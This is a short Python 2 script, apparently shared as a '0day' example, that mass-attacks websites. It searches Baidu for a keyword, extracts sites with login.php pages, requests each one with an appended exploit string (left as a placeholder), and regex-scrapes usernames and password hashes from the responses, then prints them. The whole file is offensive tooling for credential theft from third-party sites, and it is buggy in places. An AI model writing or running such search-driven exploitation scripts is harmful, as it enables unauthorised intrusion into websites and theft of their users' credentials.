#!/usr/bin/python 
#coding:utf-8 
# 
#time:2014-2-28 
#write:Jack 
#info:recommend example oday 
# 

import urllib, urllib2 
import string, re 



def Bdsearch(keyword): 
   db = {'wd':keyword} 
   res = urllib2.urlopen('http://www.baidu.com/s?'+urllib.urlencode(db)) 
   htmltext = res.read() 
   return htmltext 
text = Bdsearch('关键词') 
#print text 
exploit = "利用代码" 

def urllist(regex,text): 
   res = re.findall(regex,text) 
   return res 

def ackurl(ackurlone): 
   acku = "http://" + ackurlone + exploit 
   #print acku 
   try: 
       html = urllib2.urlopen(acku) 
       htext = html.read() 
       #print htext 
       try: 
           namepasswd = re.findall(textres,htext) 
           if len(namepasswd)<1:pass 
           matter = str(namepasswd[0]).split('|') 
           #print matter 
           print 'name:'+ matter[1]+'  '+'passwd:'+matter[2][3:19] 
       except: 
           print ackurlone+': no database' 
   except: 
       print ackurlone+': Won't open the site may have a dog!' 
       pass 

def urlring(key): 
   if 'com' in key: 
       pass 
   elif 'cn' in key: 
       pass 
#print text 
textres = r'\|\w{1,20}\|\w{20}' 
a = urllist(r'\"g\"\>.*?>.*?login.php',text) 
#print a 
for i in range(len(a)): 
   dbtext = str(a[i]) 
   b = urllist(r'\w.*?/',dbtext) 
   c = (str(b[0]))[3:-1] 
   ackurl(c)
